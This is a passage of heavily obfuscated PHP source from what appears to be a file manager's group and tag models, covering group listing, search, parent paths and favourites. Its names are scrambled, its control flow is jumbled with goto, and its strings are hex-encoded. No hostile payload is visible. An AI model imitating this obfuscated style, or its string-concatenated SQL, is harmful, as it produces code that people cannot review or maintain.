} public function listChild($b«ÉŸŒê°¶) { $a—©™öÚİ± =& $_SERVER[±á õÁ]; $BÀ¦‰ˆ‰ó™ = $this->where(array($a—©™öÚİ±[486] => $b«ÉŸŒê°¶))->_makeOrder()->selectPage(200); $this->_listDataApply($BÀ¦‰ˆ‰ó™[$a—©™öÚİ±[370]]); return $BÀ¦‰ˆ‰ó™; } public function listByID($a‚ãÉÃÄª‡) { $aùˆ‚ù¸òÅ =& $_SERVER[±á õÁ]; if (!$a‚ãÉÃÄª‡) { return array(); } $C¹‰¹‰°¢ = array($aùˆ‚ù¸òÅ[1621] => array($aùˆ‚ù¸òÅ[7], $a‚ãÉÃÄª‡)); $A¹Ù¥„œñ³ = $this->where($C¹‰¹‰°¢)->select(); $this->_listDataApply($A¹Ù¥„œñ³); return $A¹Ù¥„œñ³; } public function listSearch($d›ñé©³ˆ) { goto f¬½É¯‰; d¿àñ ‡ëÉ: $Då¨®ãÓ…… = $Då¨®ãÓ…… ? $Då¨®ãÓ…… : array(); if (!$Då¨®ãÓ…… || count($Då¨®ãÓ……[$cùï­‰ŒÏì[370]]) < 5 && Input::check($eò‰Ğ¯„ïˆ, $cùï­‰ŒÏì[321])) { goto A“ÌËí¼«İ; EŒµ§ÊìÊÇ: $Då¨®ãÓ……[$cùï­‰ŒÏì[367]][$cùï­‰ŒÏì[369]] = ceil($Då¨®ãÓ……[$cùï­‰ŒÏì[367]][$cùï­‰ŒÏì[368]] / $Då¨®ãÓ……[$cùï­‰ŒÏì[367]][$cùï­‰ŒÏì[365]]); goto F‚ÚøÌî”Ø; A“ÌËí¼«İ: $fÊî‘ÅˆÑğ = $this->groupChildrenAll($fàÌ÷ˆ£‚‹); $F÷“¯ËÛˆ = $this->_searchFromMeta($cùï­‰ŒÏì[439], $eò‰Ğ¯„ïˆ, 10, $fÊî‘ÅˆÑğ); $bÊ¢ĞĞÛö = $this->_searchFromMeta($cùï­‰ŒÏì[440], $eò‰Ğ¯„ïˆ, 10, $fÊî‘ÅˆÑğ); goto f›‚„‚øÍé; f›‚„‚øÍé: $b‰œˆ“ôÀ¶ = array_merge($F÷“¯ËÛˆ, $bÊ¢ĞĞÛö, $Då¨®ãÓ……[$cùï­‰ŒÏì[370]]); $Då¨®ãÓ……[$cùï­‰ŒÏì[370]] = array_unique_by_key($b‰œˆ“ôÀ¶, $cùï­‰ŒÏì[1621]); $Då¨®ãÓ……[$cùï­‰ŒÏì[367]][$cùï­‰ŒÏì[368]] = count($Då¨®ãÓ……[$cùï­‰ŒÏì[370]]); goto EŒµ§ÊìÊÇ; F‚ÚøÌî”Ø: } $this->_listDataApply($Då¨®ãÓ……[$cùï­‰ŒÏì[370]]); goto F³±¯ÅÍø; cøò§æ‹ä˜: if ($fàÌ÷ˆ£‚‹) { $EÆÈ—õ¼©æ = $this->getInfoSimple($fàÌ÷ˆ£‚‹); $c†í®Ÿ‘ç = $EÆÈ—õ¼©æ[$cùï­‰ŒÏì[484]] . $fàÌ÷ˆ£‚‹ . $cùï­‰ŒÏì[509]; $EªãÛë—Éñ = array($EªãÛë—Éñ, array($cùï­‰ŒÏì[484] => array($cùï­‰ŒÏì[381], $c†í®Ÿ‘ç))); } $EªãÛë—Éñ = $this->parseWhereLike($EªãÛë—Éñ); $Då¨®ãÓ…… = $this->_makeOrder()->where($EªãÛë—Éñ)->selectPage(20); goto d¿àñ ‡ëÉ; eŸ…ÂÉ¬„ç: if (!trim($eò‰Ğ¯„ïˆ)) { return !1; } $eò‰Ğ¯„ïˆ = str_replace($cùï­‰ŒÏì[1706], $cùï­‰ŒÏì[1707], $eò‰Ğ¯„ïˆ); $EªãÛë—Éñ = array($cùï­‰ŒÏì[1621] => array($cùï­‰ŒÏì[381], "{$eò‰Ğ¯„ïˆ}\45"), $cùï­‰ŒÏì[38] => array($cùï­‰ŒÏì[381], "\x25{$eò‰Ğ¯„ïˆ}\x25"), $cùï­‰ŒÏì[930] => $cùï­‰ŒÏì[1708]); goto cøò§æ‹ä˜; F³±¯ÅÍø: return $Då¨®ãÓ……; goto eá¼ÎŠ»á; f¬½É¯‰: $cùï­‰ŒÏì =& $_SERVER[±á õÁ]; $eò‰Ğ¯„ïˆ = $d›ñé©³ˆ[$cùï­‰ŒÏì[1704]]; $fàÌ÷ˆ£‚‹ = isset($d›ñé©³ˆ[$cùï­‰ŒÏì[1705]]) ? $d›ñé©³ˆ[$cùï­‰ŒÏì[1705]] : !1; goto eŸ…ÂÉ¬„ç; eá¼ÎŠ»á: } protected function groupChildrenAll($A§ˆš††Ë†) { $cª“¶êÛ¡® =& $_SERVER[±á õÁ]; if (!$A§ˆš††Ë†) { return !1; } if (is_string($A§ˆš††Ë†)) { $A§ˆš††Ë† = array($A§ˆš††Ë†); } $aÇïÕÔ´Çõ = $A§ˆš††Ë†; foreach ($A§ˆš††Ë† as $f¨öºª¡•) { $EÒŠ–¥‚‘ = $this->getInfoSimple($f¨öºª¡•); $fòöç—ù÷© = array($cª“¶êÛ¡®[484] => array($cª“¶êÛ¡®[381], $EÒŠ–¥‚‘[$cª“¶êÛ¡®[484]] . $f¨öºª¡• . $cª“¶êÛ¡®[509])); $aùˆÅƒ‚ÃŞ = $this->field($cª“¶êÛ¡®[1621])->where($fòöç—ù÷©)->select(); $aÇïÕÔ´Çõ = array_merge($aÇïÕÔ´Çõ, array_to_keyvalue($aùˆÅƒ‚ÃŞ, $cª“¶êÛ¡®[43], $cª“¶êÛ¡®[1621])); } return array_unique($aÇïÕÔ´Çõ); } private function _searchFromMeta($f³Åù«¨Œ, $B¬ÄÃÊ…†œ, $B¤‰Ù•àÙ¹, $C‚‘±çÄ›Å) { goto Fï¦ÒêÖ†; DÒåæ™†ÒŒ: $fº®Ğ¼º‹ = $this->parseWhereLike($fº®Ğ¼º‹); if ($C‚‘±çÄ›Å) { $fº®Ğ¼º‹[$FÃ®Œ¨¿ï[1621]] = array($FÃ®Œ¨¿ï[7], $C‚‘±çÄ›Å); } $E´©…òæ¾ä = Model($FÃ®Œ¨¿ï[1709])->where($fº®Ğ¼º‹)->limit($B¤‰Ù•àÙ¹)->select(); goto Cà‘•ÖÒ¬…; Cà‘•ÖÒ¬…: if (!$E´©…òæ¾ä) { return array(); } $E´©…òæ¾ä = array_to_keyvalue($E´©…òæ¾ä, $FÃ®Œ¨¿ï[43], $FÃ®Œ¨¿ï[1621]); $eÇ’ÁäÎÊ‹ = $this->where(array($FÃ®Œ¨¿ï[1700] => array($FÃ®Œ¨¿ï[7], $E´©…òæ¾ä)))->select(); goto DÜÚö¿‹õ¨; DÜÚö¿‹õ¨: if (!$eÇ’ÁäÎÊ‹) { return array(); } return $eÇ’ÁäÎÊ‹; goto BŒéù‘Éè; Fï¦ÒêÖ†: $FÃ®Œ¨¿ï =& $_SERVER[±á õÁ]; $B¬ÄÃÊ…†œ = strtolower($B¬ÄÃÊ…†œ); $fº®Ğ¼º‹ = array($FÃ®Œ¨¿ï[99] => $f³Åù«¨Œ, $FÃ®Œ¨¿ï[375] => array($FÃ®Œ¨¿ï[381], "\45{$B¬ÄÃÊ…†œ}\45")); goto DÒåæ™†ÒŒ; BŒéù‘Éè: } protected function _listDataApplyItem($a‹Ò±ŒÑãë) { $aÕÁíöÖö = array($a‹Ò±ŒÑãë); $this->_listDataApply($aÕÁíöÖö); return $aÕÁíöÖö[0]; } protected function _listDataApply(&$dÂØÄ‚¤ØÛ) { goto fÊì±Š‚Û³; bÍˆ¿…¼õ: $this->_listAppendParent($dÂØÄ‚¤ØÛ); $this->_listAppendSourceRoot($dÂØÄ‚¤ØÛ, $C‹ùÜ‘±ø“); goto AöŒó’‘º; fÊì±Š‚Û³: $dĞÀİÆ—„ë =& $_SERVER[±á õÁ]; if (!$dÂØÄ‚¤ØÛ) { return; } $C‹ùÜ‘±ø“ = array_to_keyvalue($dÂØÄ‚¤ØÛ, $dĞÀİÆ—„ë[43], $dĞÀİÆ—„ë[1621]); goto eøÑñ¢†°ˆ; eøÑñ¢†°ˆ: $this->_listAppendChildren($dÂØÄ‚¤ØÛ); $this->_listAppendChildrenMember($dÂØÄ‚¤ØÛ); $this->_listAppendMeta($dÂØÄ‚¤ØÛ, $C‹ùÜ‘±ø“); goto bÍˆ¿…¼õ; AöŒó’‘º: } private function _listAppendChildren(&$dÒ›†”³‹•) { goto fà´íÊÍå; a†Îâ‚¹“â: $B¡ïÇÀšÔ = array_to_keyvalue($B¡ïÇÀšÔ, $B˜ƒá‹Å¬[475]); foreach ($dÒ›†”³‹• as &$C¨ç³‰³) { $C¨ç³‰³[$B˜ƒá‹Å¬[1710]] = isset($B¡ïÇÀšÔ[$C¨ç³‰³[$B˜ƒá‹Å¬[1621]] . $B˜ƒá‹Å¬[1711]]); } unset($C¨ç³‰³); goto fÜÍÜ•‹óŒ; F”ÈÈÑ¡ˆ©: $cˆ…¨Á®è¦ = count($dÒ›†”³‹•); $FÆÃÅ•— = $this->tablePrefix . $this->tableName; for ($eà§ôÕÖä = 0, $Dì®ğ½‹Ğâ = 0; $eà§ôÕÖä < $cˆ…¨Á®è¦; $eà§ôÕÖä++) { $Dì®ğ½‹Ğâ++; $d×¶¨ã«®Ş = $dÒ›†”³‹•[$eà§ôÕÖä][$B˜ƒá‹Å¬[1621]]; $Dèˆˆ÷÷ôô .= "\x53\x45\x4c\105\x43\124\x20\x2a\x20\x46\x52\x4f\x4d\40\50\x53\x45\114\105\103\124\x20\47{$d×¶¨ã«®Ş}\x5f\143\150\151\x6c\144\47\40\x61\x73\x20\150\141\163\x20\x46\x52\117\115\x20\x60{$FÆÃÅ•—}\140\40\x77\150\145\x72\x65\40\x70\x61\x72\145\156\164\111\x44\75{$d×¶¨ã«®Ş}\x20\x6c\x69\155\x69\164\x20\61\51\40\x61\x73\40\164\142\x5f{$d×¶¨ã«®Ş}\40\165\156\x69\x6f\156\x20\x61\x6c\x6c\x20"; if (($Dì®ğ½‹Ğâ >= 20 || $eà§ôÕÖä == $cˆ…¨Á®è¦ - 1) && $Dèˆˆ÷÷ôô) { $Dèˆˆ÷÷ôô = substr($Dèˆˆ÷÷ôô, 0, -strlen($B˜ƒá‹Å¬[474])); $D»ÆƒíÀÊ = $this->query($Dèˆˆ÷÷ôô); $B¡ïÇÀšÔ = array_merge($B¡ïÇÀšÔ, $D»ÆƒíÀÊ); $Dì®ğ½‹Ğâ = 0; $Dèˆˆ÷÷ôô = $B˜ƒá‹Å¬[43]; } } goto a†Îâ‚¹“â; fà´íÊÍå: $B˜ƒá‹Å¬ =& $_SERVER[±á õÁ]; $Dèˆˆ÷÷ôô = $B˜ƒá‹Å¬[18]; $B¡ïÇÀšÔ = array(); goto F”ÈÈÑ¡ˆ©; fÜÍÜ•‹óŒ: } private function _listAppendChildrenMember(&$CäÆé½‰½) { goto f‚¸‡³ï¯·; b‘Ÿ‘±«–Î: $CÅ÷Ù‡¹Äâ = count($CäÆé½‰½); $aØ»Ã¯Â­ = $this->tablePrefix . $C£¶´Í«É™[1702]; for ($B„¯Şƒ™É = 0, $aÍ³£óø’¢ = 0; $B„¯Şƒ™É < $CÅ÷Ù‡¹Äâ; $B„¯Şƒ™É++) { $aÍ³£óø’¢++; $Eœ³ö™õ = $CäÆé½‰½[$B„¯Şƒ™É][$C£¶´Í«É™[1621]]; $E†ç‚õÃá .= "\123\105\x4c\105\103\x54\40\52\x20\x46\x52\x4f\115\40\50\x53\x45\114\x45\103\124\40\x27{$Eœ³ö™õ}\x5f\143\150\151\154\144\47\x20\x61\x73\x20\x68\141\163\40\106\122\x4f\115\x20\140{$aØ»Ã¯Â­}\140\x20\x77\x68\145\162\x65\40\x67\x72\x6f\165\x70\111\x44\75{$Eœ³ö™õ}\x20\x6c\151\155\151\x74\40\61\x29\x20\x61\163\x20\x74\x62\x5f{$Eœ³ö™õ}\x20\165\x6e\151\x6f\x6e\40\x61\x6c\x6c\x20"; if (($aÍ³£óø’¢ >= 20 || $B„¯Şƒ™É == $CÅ÷Ù‡¹Äâ - 1) && $E†ç‚õÃá) { $E†ç‚õÃá = substr($E†ç‚õÃá, 0, -strlen($C£¶´Í«É™[474])); $B‘Ç¨àÌ = $this->query($E†ç‚õÃá); $b§Ù™Ã–° = array_merge($b§Ù™Ã–°, $B‘Ç¨àÌ); $aÍ³£óø’¢ = 0; $E†ç‚õÃá = $C£¶´Í«É™[43]; } } goto C½˜²µŞŠ; f‚¸‡³ï¯·: $C£¶´Í«É™ =& $_SERVER[±á õÁ]; $E†ç‚õÃá = $C£¶´Í«É™[18]; $b§Ù™Ã–° = array(); goto b‘Ÿ‘±«–Î; C½˜²µŞŠ: $b§Ù™Ã–° = array_to_keyvalue($b§Ù™Ã–°, $C£¶´Í«É™[475]); foreach ($CäÆé½‰½ as &$bö ¤ñÙ …) { $bö ¤ñÙ …[$C£¶´Í«É™[1712]] = isset($b§Ù™Ã–°[$bö ¤ñÙ …[$C£¶´Í«É™[1621]] . $C£¶´Í«É™[1711]]); } unset($bö ¤ñÙ …); goto bëÜêÚéä«; bëÜêÚéä«: } private function _listAppendMeta(&$A…‹§šî, $C¾ĞªÇØùÀ) { goto f°°‚ø‰ì‡; FˆÍ­È„ç…: $eŸÛÇ¬óÔ = array_to_keyvalue_group($eŸÛÇ¬óÔ, $Føƒ‘ˆíŞ[1621]); foreach ($eŸÛÇ¬óÔ as &$d”†ĞœÜ¹à) { $d”†ĞœÜ¹à = array_to_keyvalue($d”†ĞœÜ¹à, $Føƒ‘ˆíŞ[99], $Føƒ‘ˆíŞ[375]); } unset($d”†ĞœÜ¹à); goto e•ÙÇÆÍ…¨; f°°‚ø‰ì‡: $Føƒ‘ˆíŞ =& $_SERVER[±á õÁ]; $Fåâ¸È = array($Føƒ‘ˆíŞ[1621] => array($Føƒ‘ˆíŞ[7], $C¾ĞªÇØùÀ)); $eŸÛÇ¬óÔ = Model($Føƒ‘ˆíŞ[1701])->where($Fåâ¸È)->select(); goto FˆÍ­È„ç…; e•ÙÇÆÍ…¨: foreach ($A…‹§šî as &$Bñá«ùÙÆî) { $Bñá«ùÙÆî[$Føƒ‘ˆíŞ[441]] = array(); if (isset($eŸÛÇ¬óÔ[$Bñá«ùÙÆî[$Føƒ‘ˆíŞ[1621]]])) { $Bñá«ùÙÆî[$Føƒ‘ˆíŞ[441]] = $eŸÛÇ¬óÔ[$Bñá«ùÙÆî[$Føƒ‘ˆíŞ[1621]]]; } } unset($Bñá«ùÙÆî); goto C‚ÌÔä±‰Î; C‚ÌÔä±‰Î: } protected function parentLevelArray($eŞÏˆ™ÓóÊ) { $C›‘âóš£¼ =& $_SERVER[±á õÁ]; $eŞÏˆ™ÓóÊ = explode($C›‘âóš£¼[57], trim($eŞÏˆ™ÓóÊ, $C›‘âóš£¼[57])); $eŞÏˆ™ÓóÊ = array_remove_value($eŞÏˆ™ÓóÊ, $C›‘âóš£¼[493]); return $eŞÏˆ™ÓóÊ; } private function _listAppendParent(&$añ™™´Åù) { goto fãŸĞñ§“ß; fãŸĞñ§“ß: $F ¸‰‚ƒ™È =& $_SERVER[±á õÁ]; $a‰‹‘ãŞ¹Í = array(); foreach ($añ™™´Åù as &$cœíÀç¸£) { $a‰‹‘ãŞ¹Í[$cœíÀç¸£[$F ¸‰‚ƒ™È[1621]]] = $cœíÀç¸£[$F ¸‰‚ƒ™È[38]]; $A´¯ŒÅ¢¤Ü = $this->parentLevelArray($cœíÀç¸£[$F ¸‰‚ƒ™È[484]]); foreach ($A´¯ŒÅ¢¤Ü as $F›Çˆ¥©´) { if (!isset($a‰‹‘ãŞ¹Í[$F›Çˆ¥©´])) { $a‰‹‘ãŞ¹Í[$F›Çˆ¥©´] = 0; } } } goto AÄšî‚‚À¢; AÄšî‚‚À¢: unset($cœíÀç¸£); $a¬ÊíÔ„±Ë = array(); foreach ($a‰‹‘ãŞ¹Í as $eã°öÙƒ»á => $BñÚÏ·ñ) { if (!$BñÚÏ·ñ) { $a¬ÊíÔ„±Ë[] = $eã°öÙƒ»á; } } goto eÉ ×çÏ; eÉ ×çÏ: if ($a¬ÊíÔ„±Ë) { $d¾îéÕ…â› = array($F ¸‰‚ƒ™È[1700] => array($F ¸‰‚ƒ™È[408], $a¬ÊíÔ„±Ë)); $E‘¢¬õöäÀ = $this->field($F ¸‰‚ƒ™È[1713])->where($d¾îéÕ…â›)->select(); $E –±ˆÌŸÊ = array_to_keyvalue($E‘¢¬õöäÀ, $F ¸‰‚ƒ™È[1621], $F ¸‰‚ƒ™È[38]); $a‰‹‘ãŞ¹Í = array_merge_index($a‰‹‘ãŞ¹Í, $E –±ˆÌŸÊ); } $E¾Ûê—§—Ê = $GLOBALS[$F ¸‰‚ƒ™È[6]][$F ¸‰‚ƒ™È[94]][$F ¸‰‚ƒ™È[1714]]; foreach ($añ™™´Åù as &$cœíÀç¸£) { $A´¯ŒÅ¢¤Ü = $this->parentLevelArray($cœíÀç¸£[$F ¸‰‚ƒ™È[484]]); $d‹ï‘Ô·çÂ = $F ¸‰‚ƒ™È[43]; foreach ($A´¯ŒÅ¢¤Ü as $eã°öÙƒ»á => $F›Çˆ¥©´) { if ($E¾Ûê—§—Ê && $eã°öÙƒ»á == 0) { continue; } $d‹ï‘Ô·çÂ .= $a‰‹‘ãŞ¹Í[$F›Çˆ¥©´] . $F ¸‰‚ƒ™È[8]; } if ($A´¯ŒÅ¢¤Ü) { $d‹ï‘Ô·çÂ .= $cœíÀç¸£[$F ¸‰‚ƒ™È[38]]; } $cœíÀç¸£[$F ¸‰‚ƒ™È[488]] = str_replace($F ¸‰‚ƒ™È[492], $F ¸‰‚ƒ™È[8], $d‹ï‘Ô·çÂ); } goto B¢²éÙÓÈ; B¢²éÙÓÈ: unset($cœíÀç¸£); goto a»½½´òí; a»½½´òí: } private function _listAppendSourceRoot(&$Aˆ§Ÿ“¼Ğ , $d‚ó¶ÄÇŞ) { goto a¥‰å¤ˆÌÏ; CÎÎÕŞä©’: $A²¾‡›‡ÊÜ = Model($E¨«“Çëõ¯[776])->order($E¨«“Çëõ¯[1716])->field($aÒÕøáŞ)->where($CØóÚ‚ªĞ)->select(); $A²¾‡›‡ÊÜ = array_to_keyvalue($A²¾‡›‡ÊÜ, $E¨«“Çëõ¯[481]); $A²¾‡›‡ÊÜ = array_remove_key($A²¾‡›‡ÊÜ, $E¨«“Çëõ¯[481]); goto f›Âˆ‰µæó; a¥‰å¤ˆÌÏ: $E¨«“Çëõ¯ =& $_SERVER[±á õÁ]; $CØóÚ‚ªĞ = array($E¨«“Çëõ¯[395] => SourceModel::TYPE_GROUP, $E¨«“Çëõ¯[486] => 0, $E¨«“Çëõ¯[481] => array($E¨«“Çëõ¯[7], $d‚ó¶ÄÇŞ)); $aÒÕøáŞ = $E¨«“Çëõ¯[1715]; goto CÎÎÕŞä©’; f›Âˆ‰µæó: foreach ($Aˆ§Ÿ“¼Ğ  as &$BîÀÖÖ˜ÛÁ) { $BîÀÖÖ˜ÛÁ[$E¨«“Çëõ¯[415]] = $A²¾‡›‡ÊÜ[$BîÀÖÖ˜ÛÁ[$E¨«“Çëõ¯[1621]]] ? $A²¾‡›‡ÊÜ[$BîÀÖÖ˜ÛÁ[$E¨«“Çëõ¯[1621]]] : array(); } unset($BîÀÖÖ˜ÛÁ); goto a÷£÷Õ¡¶á; a÷£÷Õ¡¶á: } protected function groupMerge($Aä›Ç¦Íˆ) { $Aä›Ç¦Íˆ = array_values(array_unique($Aä›Ç¦Íˆ)); $cöŒÂÇ²İÙ = array(); for ($EÖÄ‘îêÜ = 0; $EÖÄ‘îêÜ < count($Aä›Ç¦Íˆ); $EÖÄ‘îêÜ++) { $B¯¼ Ó£¬ = !1; for ($Fâ­–¶¼êÑ = 0; $Fâ­–¶¼êÑ < count($Aä›Ç¦Íˆ); $Fâ­–¶¼êÑ++) { if ($EÖÄ‘îêÜ == $Fâ­–¶¼êÑ) { continue; } if ($this->isParentOf($Aä›Ç¦Íˆ[$Fâ­–¶¼êÑ], $Aä›Ç¦Íˆ[$EÖÄ‘îêÜ])) { $B¯¼ Ó£¬ = !0; break; } } if (!$B¯¼ Ó£¬) { $cöŒÂÇ²İÙ[] = $Aä›Ç¦Íˆ[$EÖÄ‘îêÜ]; } } return $cöŒÂÇ²İÙ; } protected function isParentOf($CªÚ‡Ò´¼, $eÎ‹ø‡¢´æ) { goto cíˆ¡ÈÆ¸; cíˆ¡ÈÆ¸: $A¼Òä×‹· =& $_SERVER[±á õÁ]; if (!$CªÚ‡Ò´¼ || !$eÎ‹ø‡¢´æ || $CªÚ‡Ò´¼ == $eÎ‹ø‡¢´æ) { return !1; } $b¾ˆÀƒ—Ÿâ = $this->getInfoSimple($CªÚ‡Ò´¼); goto aÈ‹›–¨çñ; aÈ‹›–¨çñ: $dö’Ğ†÷¬ = $this->getInfoSimple($eÎ‹ø‡¢´æ); $F˜ºª²¡’¦ = $b¾ˆÀƒ—Ÿâ[$A¼Òä×‹·[484]] . $CªÚ‡Ò´¼ . $A¼Òä×‹·[57]; if (substr($dö’Ğ†÷¬[$A¼Òä×‹·[484]], 0, strlen($F˜ºª²¡’¦)) == $F˜ºª²¡’¦) { return !0; } goto C›îƒ¾ßù; C›îƒ¾ßù: return !1; goto CØÊËŞÄº; CØÊËŞÄº: } public function groupShowRoot($F¨”²Ü¤à, $dï•Ô‰÷–— = false) { goto dš‘ç‰‘ñ‡; AÜÁ»õ¿šÙ: if ($dï•Ô‰÷–— && count($bĞöñø—ò‡) == 1) { return $fÅŠ‡¿…Ä; } if (!$d‰¦°Û²©‡[$dØÔ«²ñŠ‰[441]] || !isset($d‰¦°Û²©‡[$dØÔ«²ñŠ‰[441]][$dØÔ«²ñŠ‰[1698]]) || $d‰¦°Û²©‡[$dØÔ«²ñŠ‰[441]][$dØÔ«²ñŠ‰[1698]] == $dØÔ«²ñŠ‰[1671]) { return $this->groupShowRoot($bĞöñø—ò‡[count($bĞöñø—ò‡) - 1], $dï•Ô‰÷–—); } if ($d‰¦°Û²©‡[$dØÔ«²ñŠ‰[441]][$dØÔ«²ñŠ‰[1698]] == $dØÔ«²ñŠ‰[362]) { $Aèåò„¯„¨ = explode($dØÔ«²ñŠ‰[57], $d‰¦°Û²©‡[$dØÔ«²ñŠ‰[441]][$dØÔ«²ñŠ‰[1699]]); if ($Aèåò„¯„¨) { $fÅŠ‡¿…Ä = array_merge($fÅŠ‡¿…Ä, $Aèåò„¯„¨); } } goto d¤Ô¹Š‰; dš‘ç‰‘ñ‡: $dØÔ«²ñŠ‰ =& $_SERVER[±á õÁ]; $d‰¦°Û²©‡ = $this->getInfo($F¨”²Ü¤à); if (!$d‰¦°Û²©‡) { return array(); } goto Bœ»§¤ÙÛ·; Bœ»§¤ÙÛ·: $bĞöñø—ò‡ = $this->parentLevelArray($d‰¦°Û²©‡[$dØÔ«²ñŠ‰[484]]); $fÅŠ‡¿…Ä = array($F¨”²Ü¤à); if (count($bĞöñø—ò‡) == 0) { return $fÅŠ‡¿…Ä; } goto AÜÁ»õ¿šÙ; d¤Ô¹Š‰: return $fÅŠ‡¿…Ä; goto Fº×ğˆ™é…; Fº×ğˆ™é…: } protected function resetParentLevel() { $aõÃµë­Ã‰ =& $_SERVER[±á õÁ]; $DÑçŸ  = $aõÃµë­Ã‰[1621]; $dğÓÒ´ÕÖä = $this->select(); $dğÓÒ´ÕÖä = array_to_keyvalue($dğÓÒ´ÕÖä, $DÑçŸ ); foreach ($dğÓÒ´ÕÖä as $BˆàÑ­ÈÓ) { goto c»ğ´àŒŒ; d–¦öİğ: $this->where(array($DÑçŸ  => $BˆàÑ­ÈÓ[$DÑçŸ ]))->save(array($aõÃµë­Ã‰[550] => $FÑÆíµ¤ÎÆ)); goto D¦Ñó°ŞÖÆ; E¿äÌÍ‡«ç: $FÑÆíµ¤ÎÆ[] = 0; $FÑÆíµ¤ÎÆ = $aõÃµë­Ã‰[57] . implode($aõÃµë­Ã‰[57], array_reverse($FÑÆíµ¤ÎÆ)) . $aõÃµë­Ã‰[57]; $this->setNamePinyin($BˆàÑ­ÈÓ[$DÑçŸ ], $BˆàÑ­ÈÓ[$aõÃµë­Ã‰[38]]); goto d–¦öİğ; c»ğ´àŒŒ: $DÖ”ßáš¹ê = $BˆàÑ­ÈÓ; $FÑÆíµ¤ÎÆ = array(); while ($DÖ”ßáš¹ê[$aõÃµë­Ã‰[486]] != 0) { $FÑÆíµ¤ÎÆ[] = $DÖ”ßáš¹ê[$aõÃµë­Ã‰[486]]; $DÖ”ßáš¹ê = $dğÓÒ´ÕÖä[$DÖ”ßáš¹ê[$aõÃµë­Ã‰[486]]]; } goto E¿äÌÍ‡«ç; D¦Ñó°ŞÖÆ: } return $dğÓÒ´ÕÖä; } public function groupNameAuto($D¾†ˆ«†÷Î, $FƒùÁ×óÒİ) { $AÃˆ‰ÓÅ• =& $_SERVER[±á õÁ]; $cÒô‚âÌĞÌ = $this->where(array($AÃˆ‰ÓÅ•[392] => $D¾†ˆ«†÷Î))->getField($AÃˆ‰ÓÅ•[38], !0); if (!$cÒô‚âÌĞÌ || !in_array($FƒùÁ×óÒİ, $cÒô‚âÌĞÌ)) { return $FƒùÁ×óÒİ; } for ($aŞ¬Ö„¯ = 1; $aŞ¬Ö„¯ <= count($cÒô‚âÌĞÌ) + 1; $aŞ¬Ö„¯++) { $dºôšÄ‘à = $FƒùÁ×óÒİ . "\50{$aŞ¬Ö„¯}\51"; if (!in_array($dºôšÄ‘à, $cÒô‚âÌĞÌ)) { return $dºôšÄ‘à; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($dì£…„³ê) { $d™ñÚ¿·˜ =& $_SERVER[±á õÁ]; return array($d™ñÚ¿·˜[1717] => array($dì£…„³ê[0], $d™ñÚ¿·˜[1718]), $d™ñÚ¿·˜[1719] => array($dì£…„³ê[0], $d™ñÚ¿·˜[1720])); } protected function get($d“µä¿²Ñ) { $aÔ‹¬Ÿ÷Ú¬ =& $_SERVER[±á õÁ]; $CÂÆ¡½ÜÕ¼ = Model($aÔ‹¬Ÿ÷Ú¬[483])->metaGet($d“µä¿²Ñ, $aÔ‹¬Ÿ÷Ú¬[1721]); $A‰ğŠ²Î‡„ = json_decode($CÂÆ¡½ÜÕ¼, !0); return $A‰ğŠ²Î‡„ ? $A‰ğŠ²Î‡„ : array($aÔ‹¬Ÿ÷Ú¬[1722] => $aÔ‹¬Ÿ÷Ú¬[93], $aÔ‹¬Ÿ÷Ú¬[370] => array()); } protected function set($dõ•÷‰ƒ•¬, $aŒâÊ¤ô¸÷) { $Fè…Ÿ†ÃêÎ =& $_SERVER[±á õÁ]; $aŒâÊ¤ô¸÷ = $aŒâÊ¤ô¸÷ ? $aŒâÊ¤ô¸÷ : array($Fè…Ÿ†ÃêÎ[1722] => $Fè…Ÿ†ÃêÎ[93], $Fè…Ÿ†ÃêÎ[370] => array()); Model($Fè…Ÿ†ÃêÎ[483])->metaSet($dõ•÷‰ƒ•¬, $Fè…Ÿ†ÃêÎ[1721], json_encode($aŒâÊ¤ô¸÷)); return Model($Fè…Ÿ†ÃêÎ[483])->metaSet($dõ•÷‰ƒ•¬, $Fè…Ÿ†ÃêÎ[1721], json_encode($aŒâÊ¤ô¸÷)); } protected function getByTagID($e”‹ô×Â•®, $b‹±×È—ˆ) { goto cÌâ†Ÿ—ö×; cÌâ†Ÿ—ö×: $A°Ï”ã†©é =& $_SERVER[±á õÁ]; if (!$e”‹ô×Â•® || !$b‹±×È—ˆ) { return !1; } if (!Model($A°Ï”ã†©é[483])->getInfoSimple($e”‹ô×Â•®)) { return !1; } goto BÖí¬‡õ‚ï; CØĞ¥µï·: return is_array($bå‚£Á¢¡å) ? $bå‚£Á¢¡å : !1; goto bİø”Ö¸Çä; BÖí¬‡õ‚ï: $b»§Õò·Ì† = $this->get($e”‹ô×Â•®); if (!$b»§Õò·Ì† || !isset($b»§Õò·Ì†[$A°Ï”ã†©é[370]])) { return !1; } $bå‚£Á¢¡å = array_find_by_field($b»§Õò·Ì†[$A°Ï”ã†©é[370]], $A°Ï”ã†©é[391], $b‹±×È—ˆ); goto CØĞ¥µï·; bİø”Ö¸Çä: } public function listSource($cíš®Ôæœ¦, $d«îÍ‘ÆŠÒ) { goto A¼Á£’ÃØõ; A¼Á£’ÃØõ: $E•Ù°Áñ”â =& $_SERVER[±á õÁ]; if ($d«îÍ‘ÆŠÒ && !is_array($d«îÍ‘ÆŠÒ)) { $d«îÍ‘ÆŠÒ = array($d«îÍ‘ÆŠÒ); } $Fß—Ö¼œ† = $this->listData($cíš®Ôæœ¦); goto d¦§îº‡œ™; c¹¢¨×—³: $F”¨Á„‘Ìö = array_to_keyvalue($bÎÕ›ˆ‹§[$E•Ù°Áñ”â[83]], $E•Ù°Áñ”â[43], $E•Ù°Áñ”â[393]); $EñØøªğ = array_merge($F”¨Á„‘Ìö, $b½Ššİ®¬ğ); foreach ($f§ìÏŠ«²† as $e‘¨êÒ† ) { if (!in_array($e‘¨êÒ† , $EñØøªğ)) { $f›Ñâ©Õ¤ï[] = $e‘¨êÒ† ; } } goto C¾¹ç…«¼œ; f­ã‰‡ÓÁ±: foreach ($Aºí§ÀöÅÜ as $b«¡Á¢Ùïø => $dŠ±ğÙ‡Áî) { $DéÑÌ‘©‰ = !0; if (!$d«îÍ‘ÆŠÒ) { $f§ìÏŠ«²†[] = $b«¡Á¢Ùïø; continue; } foreach ($d«îÍ‘ÆŠÒ as $D…ìøÂ™æ) { if (!in_array($D…ìøÂ™æ, $dŠ±ğÙ‡Áî)) { $DéÑÌ‘©‰ = !1; break; } } if ($DéÑÌ‘©‰) { $f§ìÏŠ«²†[] = $b«¡Á¢Ùïø; } } if 